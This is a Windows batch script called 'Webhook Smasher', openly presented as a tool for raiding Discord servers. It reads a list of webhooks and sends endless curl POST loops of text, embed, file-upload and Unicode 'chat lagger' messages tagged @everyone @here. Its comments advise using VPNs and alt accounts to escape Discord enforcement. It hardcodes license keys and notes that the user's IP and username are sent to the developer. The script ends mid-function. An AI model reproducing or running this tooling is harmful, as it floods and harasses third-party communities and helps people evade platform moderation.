@echo off


rem                             [!] ATTENTION [!]                              
rem ==========================================================================
rem Software, you using is safe, but is breaking DISCORD TOS!
rem By using software, you are responsible for your discord accout.
rem If your account get terminated, it's your responsibility...
rem - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
rem Is strongly recommanded - making webhooks with Alt and using VPN, when
rem you using this webhook smasher.
rem - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
rem By sharing this software as normal file can anyone report your message
rem as malware and you can get term to your account.
rem - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
rem Don't tell on big servers that, you have this tool! Again, anyone
rem can report you on support and your account will get term.
rem - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
rem We're recommanding to read this
rem https://pastebin.com/X2qFJcZw
rem ==========================================================================

cls
mode 95,25
cd "%~dp0"
rem Adding files to path only for this batch file...

set path=%path%;%cd%;%cd%\update

if not exist "update\onstart" md "update\onstart" >nul

for /f "tokens=*" %%a in ('fetch https://api.ipify.org') do set MyIP=%%a

rem Checking for update, if update is availabile, update software automaticlly.

if not exist update\NoUpdate.log call update.bat
if not exist update\NoUpdate.log if %errorlevel%==1 exit


for /f "tokens=*" %%a in ('dir /b /a "update\onstart"') do goto finalupd

color 0f

rem Read eula, if it's accepted or not, then show eula

if not exist eula.eula (set eula=false) else for /f "tokens=*" %%a in (eula.eula) do set eula=%%a

if /i %eula%==false (

    mode 95,31
    color 0c
    echo.
    echo.
    
    call :center Webhook Smasher&& set /p ".=[97m" <nul
    call :center Before we start, you need to accept eula.
    echo.[37m
    call :center This software is private and must be actived with license key.
    call :center If you don't have license key, this software is for you unusable.
    echo.
    call :center You don't have allowed to modify Webhook Smasher.
    call :center Don't make the program as a public.
    echo.
    call :center Windows 10 or newer is required, because in older
    call :center versions is not 'curl' command.
    echo.
    call :center This tool is for raiding on platform Discord.
    echo.
    call :center Raiding is against Discord TOS, so use VPN.
    echo.
    call :center Don't try to crack or/and skid this tool [software].
    call :center More info at dsc.gg/shrekova-bazina
    echo.
    call :center By updating, your IP and Username and more will be automatically
    call :center sent to a developer to prevent from a bots.
    echo.
    call :center Please read this
    call :center https://pastebin.com/X2qFJcZw
    echo.[90m
    call :center Press any key to accept.
    call :center You'll be no longer asked again.
    pause >nul
    echo.true>eula.eula
)




mode 95,25
cls
color 0f
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
call :center ...

set path=%path%;%cd%
ping localhost -n 1 >nul && title W
ping localhost -n 1 >nul && title We
ping localhost -n 1 >nul && title Web
ping localhost -n 1 >nul && title Webh
ping localhost -n 1 >nul && title Webho
ping localhost -n 1 >nul && title Webhoo
ping localhost -n 1 >nul && title Webhook
ping localhost -n 1 >nul && title Webhook S
ping localhost -n 1 >nul && title Webhook Sm
ping localhost -n 1 >nul && title Webhook Smas
ping localhost -n 1 >nul && title Webhook Smash
ping localhost -n 1 >nul && title Webhook Smashe
ping localhost -n 1 >nul && title Webhook Smasher
timeout /nobreak /t 0 >nul
timeout /nobreak /t 0 >nul
ping localhost -n 1 >nul && title Webhook Smasher ^| 
ping localhost -n 1 >nul && title Webhook Smasher ^| d
ping localhost -n 1 >nul && title Webhook Smasher ^| ds
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.g
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/s
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/sh
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shr
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shre
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrek
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shreko
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekov
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-b
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-ba
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-baz
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazi
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazin
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina

rem Verification the license key
if exist "key.key" call :verifyKey
goto active

:verifyKey
rem License key verify, if matching, goto spammer.
for /f "tokens=*" %%a in ('type key.key') do set key=%%a
set confirm=

if "%key%" == "N0LWR-SQUMD-HBRJ4-LXDLI" goto spammer_main
if "%key%" == "ML9FJ-6JL89-94C13-EN98G" goto spammer_main
if "%key%" == "TG1Z6-TEE4U-JQODS-2D4DK" goto spammer_main
if "%key%" == "TQPB2-GSYO1-UMR1M-B4A3T" goto spammer_main
if "%key%" == "Z9MSB-VZCQJ-WRAZC-RG1D1" goto spammer_main
if "%key%" == "3KPA4-YXKM9-AWVTN-PT4VL" goto spammer_main
if "%key%" == "LT1QR-XL8GN-L1CXO-UGZP4" goto spammer_main
if "%key%" == "G0R54-VKV08-7PBR7-T4ZPE" goto spammer_main
if "%key%" == "WF40R-H7O3K-EWTW7-EH24K" goto spammer_main
if "%key%" == "LU480-GUTOY-UT5G3-CSFBA" goto spammer_main

if defined confirm goto spammer_main && exit
goto :EOF

:active
cls
call :logo
echo.[97m
call :typo Before we start, license key is required.

REM Prompt for the license key.
call :prom key

set confirm=
if "%key%" == "N0LWR-SQUMD-HBRJ4-LXDLI" set confirm=APPROVED
if "%key%" == "ML9FJ-6JL89-94C13-EN98G" set confirm=APPROVED
if "%key%" == "TG1Z6-TEE4U-JQODS-2D4DK" set confirm=APPROVED
if "%key%" == "TQPB2-GSYO1-UMR1M-B4A3T" set confirm=APPROVED
if "%key%" == "Z9MSB-VZCQJ-WRAZC-RG1D1" set confirm=APPROVED
if "%key%" == "3KPA4-YXKM9-AWVTN-PT4VL" set confirm=APPROVED
if "%key%" == "LT1QR-XL8GN-L1CXO-UGZP4" set confirm=APPROVED
if "%key%" == "G0R54-VKV08-7PBR7-T4ZPE" set confirm=APPROVED
if "%key%" == "WF40R-H7O3K-EWTW7-EH24K" set confirm=APPROVED
if "%key%" == "LU480-GUTOY-UT5G3-CSFBA" set confirm=APPROVED
if defined confirm (cls && goto ConfirmA) else (
    echo.
    call :error License key is Invalid!
    pause >nul
    exit
)

:ConfirmA
echo.%key%>key.key





:spammer_main

set attempts=2

if not exist update\webhook.dat (
    echo.unset
)>update\webhook.dat


if not exist update\psw.dat goto pswbypass

:psw_asking


cls
call :logo
echo.[37m

call :write Please, enter a verification password
call :write to identify you.
echo.


call :prom askPsw

cd update
for /f "tokens=*" %%a in (psw.dat) do set selPsw=%%a

cd ..

if not "%askPsw%" == "%selPsw%" (

    set /a attempts-=1
    if %attempts%==0 goto pswFail

    echo.
    echo.
    call :error Invalid verification,
    call :error %attempts% attempts left.

    timeout /t 3 >nul
    goto psw_asking
)




set askPsw=
set selPsw=

cls
color 0f
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
call :center ...

:pswbypass









setlocal enabledelayedexpansion
set req=0
set count=0
for /f "tokens=*" %%a in (webhooks.txt) do set /a count+=1

ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^|
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| L
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Lo
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loa
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Load
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loade
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded 
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count!
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! w
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! we
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! web
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! webh
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! webho
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! webhoo
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! webhook
ping localhost -n 1 >nul && title Webhook Smasher ^| dsc.gg/shrekova-bazina ^| Loaded !count! webhooks


endlocal


if exist "%cd%\webhooks.txt" for /f "tokens=*" %%a in ("%cd%\webhooks.txt") do if %%~za == 0 (
    cls
    call :logo
    echo.
    call :write You have no added webhooks in webhooks.txt,
    call :write no requests will be sent.
    echo.
    call :write Please add webhooks now.
    call :write After adding, restart program please!
    pause >nul
)

if not exist "%cd%\webhooks.txt" (
    cls
    echo.>webhooks.txt
    call :logo
    echo.
    call :write Webhooks file doesn't exists, we
    call :write created one for you.
    echo.
    call :write Add your webhooks to webhooks.txt.
    call :write After adding, restart program please!
    pause >nul
)




:menum
cls
call :logo
echo.[97m
rem Selection menu of spammer.
call :typo Do you want something?
echo.

echo. [37m[E][90mmbed [30m^| [37m[B][90mrutal Chat lagger [30m^| [37m[M][90media Spam
echo. [37m[C][90montent only [30m^| [37m[U][90mpdate Settings [30m^| [37m[D][90misplay Changelog
echo. [37m[L][90micense Gen [30m^| [37m[S][90mupport Form [30m^| [37m[P][90massword
echo. [37m[A][90mpp Info [30m^| [37m[W][90mebhook to Contact[30m?
echo.
echo.


for /f "tokens=*" %%a in ('type update\version.log') do set vers=%%a
for /f "tokens=*" %%a in ('type update\vid.log') do set versid=%%a

set temp_change=%vers%

set len4=
:lengthloo4
if defined temp_change (
set temp_change=%temp_change:~1%
set /A len4 += 1
goto lengthloo4 )

set /a vds=93 - %len4%

curpos %vds% 23
set /p ".=[90m%vers%" <nul





::call :write Beta Testers - Mario

:awaitMenu
choice /c ECBMUDLSPAW /m "" /n >nul

if %errorlevel% equ 1 (set type=embed) else (
    if %errorlevel% equ 3 goto chats
    if %errorlevel% equ 4 goto media
    if %errorlevel% equ 5 goto updateCheck
    if %errorlevel% equ 6 goto fetchChangelog
    if %errorlevel% equ 7 goto licgen
    if %errorlevel% equ 8 goto conform
    if %errorlevel% equ 9 goto pswnewset
    if %errorlevel% equ 10 goto appinfo
    if %errorlevel% equ 11 goto sethook
    set type=content
)

if /i %type%==embed (goto embed) else (goto content)

:embed
cls
call :logo
echo.[37m
call :typo Please, select a mode of embed setup.
call :typo Classic mode is recommanded...
echo.
call :typo In advanced, you can do with embed anything.
echo.
echo. [37m[C][90mlassic [30m^| [37m[A][90mdvanced mode[30m?
choice /c CA /m "" /n

if %errorlevel%==1 (goto classic.embed) else (goto adv.embed)

:adv.embed
cls
call :logo
echo.[90m
call :typo Don't use special characters...
call :typo Configuration file has been opened.

(
    echo // Advanced Embed setup in One-Line JSON format.
    echo // Only for advanced users. By destroying format,
    echo // will not be webhook request sent!
    echo.
    echo {"content":"Main Content","embeds":[{"title":"TITLE","description":"DESCRIPTION","url":"https://TITLE.URL","color":6684672,"author":{"name":"AUTHOR","icon_url":"https://AUTHOR.ICON"},"footer":{"text":"FOOTER","icon_url":"https://FOOTER.URL"},"image":{"url":"https://IMAGE.URL"},"thumbnail":{"url":"https://THUMBNAIL.URL"}}]}
)>"%temp%\webhook_settings.json"

"%temp%\webhook_settings.json"



for /f "tokens=*" %%a in (%temp%\webhook_settings.json) do set json=%%a
set json=%json:"=\"%

timeout /nobreak /t 0 >nul && del /f /q "%temp%\webhook_settings.json" >nul

call :typo Starting...
timeout /nobreak /t 3 >nul
echo.

cls
call :logo
echo.[37m
call :typo Sending requests in progress...
setlocal enabledelayedexpansion
for /f %%a in ('copy /Z "%~dpf0" nul') do set "cr=%%a"

:looph
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "%json%" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "%json%" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
timeout /nobreak /t 0 >nul
for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "%json%" %%a >nul && set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
goto looph

:classic.embed
cls
call :logo
echo.[90m
call :typo Don't use special characters...
echo.[97m
call :prom title "Title of embed: "
echo.
call :prom description "Description of embed: "
echo.
call :prom texta "Text above embed: "
echo.
call :typo You you want enable random embed color? Y/N
choice /c YN /m "" /n

if %errorlevel% equ 1 (set colore=random) else (set color=3092790)
cls
call :logo
echo.[37m
call :typo Sending requests in progress...
setlocal enabledelayedexpansion
for /f %%a in ('copy /Z "%~dpf0" nul') do set "cr=%%a"

:loopab
if "%colore%"=="random" set color=%random:~-2%%random:~-2%%random:~-2%
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\":\"%texta%\",\"embeds\":[{\"title\":\"%title%\",\"description\":\"%description%\",\"color\":%color%}]}" %%a >nul
set /a req+=1&& set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
if "%colore%"=="random" set color=%random:~-2%%random:~-2%%random:~-2%
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\":\"%texta%\",\"embeds\":[{\"title\":\"%title%\",\"description\":\"%description%\",\"color\":%color%}]}" %%a >nul
set /a req+=1&& set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
if "%colore%"=="random" set color=%random:~-2%%random:~-2%%random:~-2%
for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\":\"%texta%\",\"embeds\":[{\"title\":\"%title%\",\"description\":\"%description%\",\"color\":%color%}]}" %%a >nul && set /a req+=1&& set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
goto loopab

:content
setlocal enabledelayedexpansion

echo.
cls
call :logo
echo.[90m
call :typo Don't use special characters.
echo.[97m
call :typo Message content:
call :prom content
echo.
call :typo Append random string? Y/N

choice /C YN /M "" /N
if %errorlevel%==1 (set rnd=y) else (set rnd=n)

cls
call :logo
echo.[37m
call :typo Sending requests in progress...
setlocal enabledelayedexpansion
for /f %%a in ('copy /Z "%~dpf0" nul') do set "cr=%%a"


:loop
rem Content spammer - fastest of all

if /i "%rnd%" == "y" set str= [%random:~-1%%random:~-1%%random:~-1%%random:~-1%%random:~-1%]
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%content%%str%\"}" %%a >nul 
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

if /i "%rnd%" == "y" set str= [%random:~-1%%random:~-1%%random:~-1%%random:~-1%%random:~-1%]
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%content%%str%\"}" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

if /i "%rnd%" == "y" set str= [%random:~-1%%random:~-1%%random:~-1%%random:~-1%%random:~-1%]
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%content%%str%\"}" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

if /i "%rnd%" == "y" set str= [%random:~-1%%random:~-1%%random:~-1%%random:~-1%%random:~-1%]
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%content%%str%\"}" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

if /i "%rnd%" == "y" set str= [%random:~-1%%random:~-1%%random:~-1%%random:~-1%%random:~-1%]
for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%content%%str%\"}" %%a >nul && set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

goto loop


:logo
echo.[37m

echo       _    _      _     _                 _      _____                     _               
echo      ^| ^|  ^| ^|    ^| ^|   ^| ^|               ^| ^|    /  ___^|                   ^| ^|              
echo      ^| ^|  ^| ^| ___^| ^|__ ^| ^|__   ___   ___ ^| ^| __ \ `--. _ __ ___   __ _ ___^| ^|__   ___ _ __ 
echo      ^| ^|/\^| ^|/ _ \ '_ \^| '_ \ / _ \ / _ \^| ^|/ /  `--. \ '_ ` _ \ / _` / __^| '_ \ / _ \ '__^|
echo      \  /\  /  __/ ^|_) ^| ^| ^| ^| (_) ^| (_) ^|   ^<  /\__/ / ^| ^| ^| ^| ^| (_^| \__ \ ^| ^| ^|  __/ ^|   
echo       \/  \/ \___^|_.__/^|_^| ^|_^|\___/ \___/^|_^|\_\ \____/^|_^| ^|_^| ^|_^|\__,_^|___/_^| ^|_^|\___^|_^|   

exit /b

:chats
rem Brutal chat lagger
cls
call :logo
echo.[37m
call :typo Sending requests in progress...
setlocal enabledelayedexpansion
for /f %%a in ('copy /Z "%~dpf0" nul') do set "cr=%%a"

:loopb
start /min cmd.exe /c for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"https://tenor.com/view/\u9f98\u0040\u9f98\u9f98\u9f98\u0038\u9f98\u9f98-14138658?size=\u9f98\u9f98\u9f98\u9f98\u9f98\u0324\u0033\u2623\u9f98\u0021\u0037\u9f98\u9f98\u0308\u9f98\u9f98\u9f98\u9f98\u9f98\u0031\u9f98\u9f98\u9f98\u0031\u9f98\u9f98\u9f98\u0077\u0021\u27a4\u9f98\u9f98\u9f98\u0308\u2640\u0034\u9f98\u0023\u0034\u2623\u0024\u0324\u9f98\u0023\u9f98\u003a\u9f98\u0040\u9f98\u9f98\u9f98\u0038\u9f98\u9f98\ua9c1\uff08\u9f98\u9f98\u256d\u2640\u9f98\u9f98\u0025\u0077\u2620\ufe36\u9f98\u0308\u002a\u9f98\u9f98\u9f98\u9f98\u0308\u9f98\u0308\u9f98\u9f98\u0025\u002a\u9f98\u9f98\u9f98\u2623\u9f98\u9f98\u0038\u9f98\u005e\u9f98\ufe36\u9f98\u9f98\u9f98\u9f98\u9f98\u2640\u9f98\u9f98\u9f98\u9f98\ua9c1\u9f98\u0024\u9f98\u9f98\ua9c1\u002a\u007e\u9f98\u9f98\u9f98\u9f98\u007e\ufe3f\u0039\u9f98\u9f98\u9f98\u9f98\ua9c2\u9f98\ua9c2\ua9c2\u0026\u0038\u9f98\u0032\u9f98\u0308\u005f\u0038\u9f98\u9f98\u0324\u9f98\u9f98\u9f98\ufe3f\u9f98\u9f98\u9f98\u9f98\ufe3f\u2229\u0064\u0025\u9f98\u003a\u9f98\u9f98\uff09\u9f98\ufe36\u2623\u0031\u9f98\u9f98\u9f98\u9f98\u0039\u21dd\u256e\u9f98\u9f98\u9f98\u9f98\u0035\u9f98\u9f98\u0324\uff08\u9f98\uff08\u0030\uff09\u9f98\u9f98\u9f98\u9f98\u9f98\u0024\u9f98\u0324\u9f98\u9f98\uff09\u9f98\u003a\u0308\u9f98\u9f98\u9f98\u9f98\u0308\u256d\u9f98\u0024\u9f98\u9f98\u003a\u007e\u0037\u9f98\u0033\u2620\u9f98\u0308\ufe3f\u9f98\u0024\u0035\u9f98\u2640\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u005f\u0308\u9f98\ua9c2\u9f98\u9f98\u9f98\u0035\u9f98\u9f98\u9f98\u9f98\u2640\u21dd\ua9c2\u9f98\u0037\u9f98\ufe36\u9f98\u0032\u9f98\ua9c2\u0324\u2620\u9f98\u27a4\u0308\u9f98\u9f98\u9f98\u9f98\u002d\u9f98\u9f98\u007e\u0324\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u005e\u0308\u9f98\u9f98\u9f98\u007e\u9f98\u9f98\u9f98\u0064\u9f98\u2640\u0021\ua9c1\u9f98\u003a\u2620\uff08\u9f98\ufe36\u007e\u0036\u9f98\ufe36\u9f98\u005e\u0308\ua9c2\u9f98\u9f98\u9f98\u2623\u0324\u9f98\u256d\u9f98\u9f98\u9f98\u0077\u0324\u9f98\u9f98\u0021\u9f98\u0021\ufe36\u9f98\u005e\u9f98\u0324\ua9c2\u2623\ua9c2\u21dd\u9f98\u007e\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u007e\u9f98\u9f98\u9f98\u0034\u9f98\u0324\u9f98\u9f98\u27a4\ufe36\u0026\ua9c2\u0308\u9f98\u9f98\u9f98\u0030\u005e\u0021\u005f\u9f98\ufe36\u9f98\u9f98\u9f98\u9f98\u9f98\ufe36\u27a4\u9f98\u0308\u9f98\u30c5\u9f98\u9f98\u9f98\ufe36\u30c5\u9f98\u0024\u0024\u007e\ua9c1\u9f98\u9f98\u0308\u21dd\u0308\u002d\u9f98\u9f98\u9f98\u003a\u9f98\u0021\u27a4\u9f98\uff09\u2623\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u0035\u9f98\u9f98\u9f98\u256e\u9f98\u9f98\u9f98\u0034\u9f98\u0038\uff08\u9f98\uff09\u9f98\u2229\u0025\uff09\u0038\u9f98\u0024\u0064\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u003a\u9f98\u9f98\ufe36\u9f98\u9f98\u0035\u0324\u9f98\u21dd\u0024\u0324\u0324\u9f98\u9f98\ufe3f\u0308\u005f\u9f98\u0021\u9f98\u9f98\u0033\u9f98\u9f98\uff08\u9f98\u9f98\u003a\u9f98\ufe36\u9f98\u9f98\u9f98\u9f98\u2640\u0064\u9f98\u9f98\u0308\u9f98\u9f98\u9f98\u0308\u9f98\u9f98\u9f98\u0032\u9f98\u0026\u0037\u003a\u0035\u9f98\u003a\u9f98\u9f98\u9f98\u0308\ua9c1\u9f98\u005f\u9f98\u30c5\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u0324\u005f\u0308\u9f98\u9f98\u9f98\u0308\ufe36\u9f98\u9f98\u0031\u2229\u0324\u9f98\u0324\u007e\u0308\u2640\u9f98\u9f98\u0324\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u0035\u007e\u0025\u2620\u0064\u9f98\u9f98\u0023\u9f98\u9f98\u9f98\u9f98\u0037\u9f98\u0032\u002a\u9f98\u9f98\u9f98\u2640\u9f98\u0034\u9f98\u9f98\uff09\u2640\u9f98\u9f98\u9f98\u9f98\u0077\u0037\u9f98\u9f98\u9f98\u9f98\u9f98\u0032\u9f98\u0032\u9f98\u9f98\u9f98\u0324\u9f98\u0035\ufe36\u0036\u9f98\ufe36\u2640\u9f98\u9f98\u9f98\u005e\u0031\u0324\u002a\u9f98\u002d\u0021\u005f\u27a4\u9f98\u0324\u9f98\u9f98\u9f98\u9f98\u2229\ufe36\u9f98\u9f98\u9f98\u9f98\u9f98\u256d\u256e\u0023\u256e\u9f98\u9f98\u005f\u9f98\u9f98\u9f98\u0308\u9f98\u0308\u9f98\ufe36\u9f98\u007e @everyone @here\"}" %%a >nul
set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
for /f "tokens=*" %%a in (webhooks.txt) do curl -X POST -H "Content-type: application/json" --data "{\"content\": \"\u9f98\u9f98\u003a\u9f98\ufe36\u9f98\u9f98\u9f98\u9f98\u2640\u0064\u9f98\u9f98\u0308\u9f98\u9f98\u9f98\u0308\u9f98\u9f98\u9f98\u0032\u9f98\u0026\u0037\u003a\u0035\u9f98\u003a\u9f98\u9f98\u9f98\u0308\ua9c1\u9f98\u005f\u9f98\u30c5\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u0324\u005f\u0308\u9f98\u9f98\u9f98\u0308\ufe36\u9f98\u9f98\u0031\u2229\u0324\u9f98\u0324\u007e\u0308\u2640\u9f98\u9f98\u0324\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u9f98\u0035\u007e\u0025\u2620\u0064\u9f98\u9f98\u0023\u9f98\u9f98\u9f98\u9f98\u0037\u9f98\u0032\u002a\u9f98\u9f98\u9f98\u2640\u9f98\u0034\u9f98\u9f98\uff09\u2640\u9f98\u9f98\u9f98\u9f98\u0077\u0037\u9f98\u9f98\u9f98\u9f98\u9f98\u0032\u9f98\u0032\u9f98\u9f98\u9f98\u0324\u9f98\u0035\ufe36\u0036\u9f98\ufe36\u2640\u9f98\u9f98\u9f98\u005e\u0031\u0324\u002a\u9f98\u002d\u0021\u005f\u27a4\u9f98\u0324\u9f98\u9f98\u9f98\u9f98\u2229\ufe36\u9f98\u9f98\u9f98\u9f98\u9f98\u256d\u256e\u0023\u256e\u9f98\u9f98\u005f\u9f98\u9f98\u9f98\u0308\u9f98\u0308\u9f98\ufe36\u9f98\u007e @everyone @here\"}" %%a >nul && set /a req+=1 && set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul
goto loopb

:media
rem Media spammer
setlocal enabledelayedexpansion
cls
call :logo
echo.[97m
call :typo Drag and drop any file here.
call :prom file

if not exist "%file%" exit

cls
call :logo
echo.[37m
call :typo Sending requests in progress...
set file=%file:"=%
setlocal enabledelayedexpansion
for /f %%a in ('copy /Z "%~dpf0" nul') do set "cr=%%a"

:loopgt
rem Loop for the media spammer
for /f "tokens=*" %%a in (webhooks.txt) do curl -F "file=@%file%" %%a >nul
set /a req+=1
set /p ".=[90m | [97m!req! [37mrequests have been sent. !cr!" <nul

goto loopgt



:typo

set /p ".=[90m | [97m" <nul
set lines=1 & set "line1=%*"

setlocal enabledelayedexpansion
for /f %%a in ('"prompt $H&for %%b in (1) do rem"') do set "BS=%%a"
for /L %%a in (1,1,%lines%) do set num=0&set "line=!line%%a!"
call :type & endlocal
goto :endtype  & goto :EOF 
:type 
set "letter=!line:~%num%,1!"
set "delay=21634"

set "delay=%delay:~-6%" & if not "%letter%"=="" set /p "=a%bs%%letter%" <nul
for /L %%b in (1,3,%delay%) do rem
if "%letter%"=="" echo.& goto :EOF 
set /a num+=1 & goto :type 
:endtype 
endlocal
exit /b

:prom

set tempid=%random%-%random%-%random%-%random%

if not "%~2"=="" (
    set /p ".=[90m | [37m" <nul
    (
    echo strText=wscript.arguments(0^)
    echo intTextLen = Len(strText^)
    echo intPause = 1
    echo For x = 1 to intTextLen
    echo     strTempText = Mid(strText,x,1^)
    echo     WScript.StdOut.Write strTempText
    echo     WScript.Sleep intPause
    echo Next
    )>%tmp%\%tempid%.vbs
    cscript /noLogo "%tmp%\%tempid%.vbs" "%~2"
    del /f /q "%tmp%\%tempid%.vbs" >nul 2>&1

